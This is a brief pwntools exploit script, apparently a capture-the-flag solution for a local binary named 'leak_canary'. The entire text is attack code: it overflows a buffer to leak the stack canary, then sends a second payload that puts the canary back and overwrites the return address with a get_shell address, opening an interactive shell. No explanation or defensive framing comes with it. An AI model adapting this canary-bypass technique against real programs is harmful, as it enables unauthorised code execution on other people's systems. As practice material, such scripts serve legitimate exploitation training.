from pwn import *
p = process("./leak_canary")
get_shell = 0x0804859B
p.recvuntil("Hello Hacker!\n")
offset = 0x70-0xC
payload = (offset)*"a" + "b"
p.send(payload)
p.recvuntil("ab")
canary = u32(p.recv(3).rjust(4,"\x00"))
log.success("canary:"+hex(canary))
payload2 =(offset)*"a" + p32(canary) + "b"*12 + p32(get_shell)
p.send(payload2)
p.interactive()
